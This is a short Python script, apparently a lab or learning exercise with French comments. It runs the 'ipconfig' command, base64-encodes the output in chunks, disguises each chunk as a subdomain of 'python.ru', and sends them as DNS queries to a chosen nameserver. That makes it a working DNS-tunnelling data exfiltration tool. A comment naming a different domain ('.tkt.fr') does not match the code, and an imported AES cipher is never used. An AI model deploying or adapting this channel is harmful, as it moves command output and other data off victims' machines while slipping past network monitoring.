from dns import resolver
import subprocess
import base64
import time
from Crypto.Cipher import AES

def chunk(data):
    chunk_size = 32
    chunks = []

    # Iterate over the data in chunk_size intervals
    for i in range(0, len(data), chunk_size):
        # Get the current chunk
        chunk = data[i:i+chunk_size]

        # Encode the chunk using base64
        encoded_chunk = base64.b64encode(chunk.encode()).decode()

        # Append ".tkt.fr" to the end of the encoded chunk
        encoded_chunk += ".python.ru"

        # Add the encoded chunk to the chunks array
        chunks.append(encoded_chunk)

    return chunks

# Example usage with subprocess
command = "ipconfig"
process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
output_binary = process.communicate()[0]

# Convert the output to string
output_string = output_binary.decode()

data = chunk(output_string)
print(data)

HOST = '192.168.1.6'
PORT = 53

# Créer une instance de resolver
res = resolver.Resolver()

# Spécifier le serveur DNS
res.nameservers = [HOST]
res.port = PORT

for requests in data:
    answer = res.resolve(requests, 'A')
    time.sleep(0.5)
    for ipval in answer:
        print('IP', ipval.to_text())